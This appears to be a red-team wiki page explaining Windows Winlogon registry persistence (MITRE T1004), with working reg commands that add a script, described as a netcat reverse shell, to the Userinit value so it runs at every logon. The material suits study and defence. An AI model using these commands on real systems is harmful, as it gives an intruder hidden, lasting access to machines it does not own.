# Windows Logon Helper

> Winlogon.exe is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.
>
> [https://attack.mitre.org/techniques/T1004/](https://attack.mitre.org/techniques/T1004/)

Commonly abused Winlogon registry keys and value for persistence are:

```
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify 
HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
```

> [!INFO]
> HKCU can also be replaced with HKLM for a system wide persistence, if you have admin privileges.

## Execution

Let's run through the techqnique abusing the `userinit` subkey.

Let's see what's currently held at the `userinit`:

```
reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
```

![[image (424).png]]

Let's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to be launched when the compromised machine reboots:

```
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
```

![[image (425).png]]

Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:

![[image (426).png]]

## References

[attack.mitre.org/techniques/T1004](https://attack.mitre.org/techniques/T1004/)
